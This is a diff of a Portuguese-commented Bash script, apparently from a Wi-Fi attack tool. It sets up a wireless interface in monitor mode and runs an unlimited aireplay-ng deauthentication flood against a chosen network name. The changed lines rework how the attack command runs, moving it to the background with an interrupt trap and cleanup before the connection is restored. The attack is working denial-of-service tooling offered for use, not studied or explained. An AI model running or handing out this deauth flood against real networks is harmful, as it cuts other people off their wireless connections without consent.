@@ -20,16 +20,12 @@ echo "
    ░ ░  ░   ░   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░     ░   ▒   ░       ░       ░   ▒  ░       ░ ░░ ░ 
       ░      ░  ░    ░  ░  ░             ░  ░  ░         ░  ░                    ░  ░ ░     ░  ░   
        ░                                                                               ░              
-       
-       "
+"
 
 #INTERFACE DA REDE
 INTERFACE="$(sudo route | grep '^default' | grep -o '[^ ]*$')"
 #ARQUIVO TEMPORÁRIO PARA GUARDAR A LISTA DE REDES ENCONTRADAS
 ARQUIVOTMP=$(mktemp)
-#APLICAÇÃO DE TERMINAL UTILIZADA
-TERMINAL=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
-
 
 #RESTAURA A CONEXÃO DO COMPUTADOR
 restaura-conexao()
@@ -128,8 +124,13 @@ echo "Concluído."
 
 
 echo "Executando ataque..."
-sudo $TERMINAL -e sudo aireplay-ng -0 0 -e "$REDE" $INTERFACE"mon" 2> /dev/null
-echo "Ataque finalizado!"
 
+aireplay-ng -0 0 -e "$REDE" $INTERFACE"mon" 1> /dev/null &
+trap " " SIGINT 
+wait
+kill $!
+wait $! 2>/dev/null
+echo ""
+echo "Ataque finalizado!"
 restaura-conexao
 echo "Have a nice day!!!"
